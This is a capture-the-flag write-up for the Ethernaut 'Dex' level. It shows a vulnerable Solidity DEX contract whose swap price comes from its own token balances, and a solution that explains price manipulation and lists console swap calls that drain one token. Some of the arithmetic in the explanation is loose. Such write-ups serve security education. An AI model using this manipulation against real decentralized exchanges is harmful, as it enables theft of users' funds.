
The goal of this level is for you to hack the basic [DEX](https://en.wikipedia.org/wiki/Decentralized_exchange) contract below and steal the funds by price manipulation.

You will start with 10 tokens of `token1` and 10 of `token2`. The DEX contract starts with 100 of each token.

You will be successful in this level if you manage to drain all of at least 1 of the 2 tokens from the contract, and allow the contract to report a "bad" price of the assets.

### Quick note

Normally, when you make a swap with an ERC20 token, you have to `approve` the contract to spend your tokens for you. To keep with the syntax of the game, we've just added the `approve` method to the contract itself. So feel free to use `contract.approve(contract.address, <uint amount>)` instead of calling the tokens directly, and it will automatically approve spending the two tokens by the desired amount. Feel free to ignore the `SwappableToken` contract otherwise.

  Things that might help:

-   How is the price of the token calculated?
-   How does the `swap` method work?
-   How do you `approve` a transaction of an ERC20?

```
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import '@openzeppelin/contracts/math/SafeMath.sol';
import '@openzeppelin/contracts/access/Ownable.sol';

contract Dex is Ownable {
  using SafeMath for uint;
  address public token1;
  address public token2;
  constructor() public {}

  function setTokens(address _token1, address _token2) public onlyOwner {
    token1 = _token1;
    token2 = _token2;
  }
  
  function addLiquidity(address token_address, uint amount) public onlyOwner {
    IERC20(token_address).transferFrom(msg.sender, address(this), amount);
  }
  
  function swap(address from, address to, uint amount) public {
    require((from == token1 && to == token2) || (from == token2 && to == token1), "Invalid tokens");
    require(IERC20(from).balanceOf(msg.sender) >= amount, "Not enough to swap");
    uint swapAmount = getSwapPrice(from, to, amount);
    IERC20(from).transferFrom(msg.sender, address(this), amount);
    IERC20(to).approve(address(this), swapAmount);
    IERC20(to).transferFrom(address(this), msg.sender, swapAmount);
  }

  function getSwapPrice(address from, address to, uint amount) public view returns(uint){
    return((amount * IERC20(to).balanceOf(address(this)))/IERC20(from).balanceOf(address(this)));
  }

  function approve(address spender, uint amount) public {
    SwappableToken(token1).approve(msg.sender, spender, amount);
    SwappableToken(token2).approve(msg.sender, spender, amount);
  }

  function balanceOf(address token, address account) public view returns (uint){
    return IERC20(token).balanceOf(account);
  }
}

contract SwappableToken is ERC20 {
  address private _dex;
  constructor(address dexInstance, string memory name, string memory symbol, uint256 initialSupply) public ERC20(name, symbol) {
        _mint(msg.sender, initialSupply);
        _dex = dexInstance;
  }

  function approve(address owner, address spender, uint256 amount) public returns(bool){
    require(owner != _dex, "InvalidApprover");
    super._approve(owner, spender, amount);
  }
}
```


**SOLUTION:**


The exploit on this level is the reliance on a single oracle source for token price. Specifically token prices are relevant to tokens A and B and calculated with a division between the token A and token B in the DEX contract. In the beggining the price is 1:1 as 100/100 specifies. However if we swap all our A tokens with B tokens, then the DEX contract will have 110 A tokens and 90 B tokens. FOr this reason the price fluctuates and becomes in this case 110/90 = 1:1.2, which means that token B costs 1.2 x (token A). After the first swap we have 24 token A and 0 token B and the DEX contract has 86 A tokens and 110 B tokens with a price of 1:0.78, which means that token A costs 0.78 x (token B), also increasing the relevant token value in the next swap, in which we have 0 token A and 24/0.78 = 30 token B.
Repeat this a few more times by swapping our entire balance and we'll be able to drain the funds of the dex.

```
let a = await contract.token1();
let b = await contract.token2();
await contract.approve(instance, "1000000000000");
await contract.swap(a, b, 10);
await contract.swap(b, a, 20);
await contract.swap(a, b, 24);
await contract.swap(b, a, 30);
await contract.swap(a, b, 41);
await contract.swap(b, a, 45); // the reason why we use 45 here instead of the entire balance of B of B of 65 is because the dex doesn't have enough a to give back to us. So we need to calculate the right amount of b to use to ensure that we can fully drain a i.e. 110/156*65 = 45.
```